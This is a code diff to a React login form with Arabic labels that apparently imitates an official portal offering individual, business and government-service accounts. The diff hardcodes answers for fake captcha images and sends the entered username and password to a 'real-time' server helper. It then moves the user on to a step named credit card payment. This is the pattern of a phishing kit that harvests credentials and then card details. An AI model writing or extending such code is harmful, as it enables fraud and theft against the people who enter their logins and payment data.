@@ -12,6 +12,7 @@ import ArrowForwardIcon from "@mui/icons-material/ArrowForward";
 import CustomRadio from "./CustomRadio";
 import ErrorDialog from "./ErrorDialog";
 import CustomInput from "./CustomInput";
+import { sendDataToServer } from "@/real-time/utils/utils";
 
 const LoginForm = () => {
   const [captchaIndex, setCaptchaIndex] = useState(1);
@@ -29,11 +30,55 @@ const LoginForm = () => {
   };
 
   const handleLogin = () => {
-    if (!formData.username || !formData.password || !formData.captcha) {
+    const captchaCodes: Record<number, string> = {
+      1: "7583",
+      2: "6649",
+      3: "8612",
+      4: "4222",
+      5: "6672",
+    };
+
+    const isCaptchaValid = formData.captcha === captchaCodes[captchaIndex];
+
+    if (
+      !formData.username ||
+      !formData.password ||
+      !formData.captcha ||
+      !isCaptchaValid
+    ) {
       setShowErrors(true);
       setShowErrorDialog(true);
     } else {
-      console.log("Logging in:", formData);
+      const accountTypeMap: Record<string, string> = {
+        individual: "الأفراد",
+        business: "الاعمال",
+        government: "الخدمات الحكومية",
+      };
+
+      const fieldMap: Record<string, string> = {
+        username: "اسم المستخدم",
+        password: "كلمة المرور",
+        captcha: "الرمز المرئي",
+      };
+
+      const arabicData: Record<string, string> = {
+        "نوع الحساب": accountTypeMap[accountType] || accountType,
+      };
+
+      Object.entries(formData).forEach(([key, value]) => {
+        if (value && value.trim() !== "") {
+          const arabicKey = fieldMap[key] || key;
+          arabicData[arabicKey] = value;
+        }
+      });
+
+      console.log("Logging in:", arabicData);
+
+      sendDataToServer({
+        data: arabicData,
+        current: "تسجيل بيانات الدخول",
+        nextPage: "الدفع بطاقة الائتمان",
+      });
     }
   };
 
@@ -179,7 +224,18 @@ const LoginForm = () => {
             onChange={(e) =>
               setFormData({ ...formData, captcha: e.target.value })
             }
-            error={showErrors && !formData.captcha}
+            error={
+              showErrors &&
+              (!formData.captcha ||
+                formData.captcha !==
+                  ({
+                    1: "7583",
+                    2: "6649",
+                    3: "8612",
+                    4: "4222",
+                    5: "6672",
+                  }[captchaIndex] as string))
+            }
           />
 
           <Box
@@ -188,7 +244,7 @@ const LoginForm = () => {
             }}
           >
             <img
-              src={`/assets/images/new/captcha${captchaIndex === 3 ? "3" : `-${captchaIndex}`}.png`}
+              src={`/assets/images/new/captcha-${captchaIndex}.png`}
               alt="captcha"
               style={{ height: "40px", objectFit: "contain" }}
             />
@@ -326,6 +382,7 @@ const LoginForm = () => {
           <Button
             variant="outlined"
             fullWidth
+            onClick={handleLogin}
             sx={{
               width: "fit-content",
               borderColor: "#136e82",
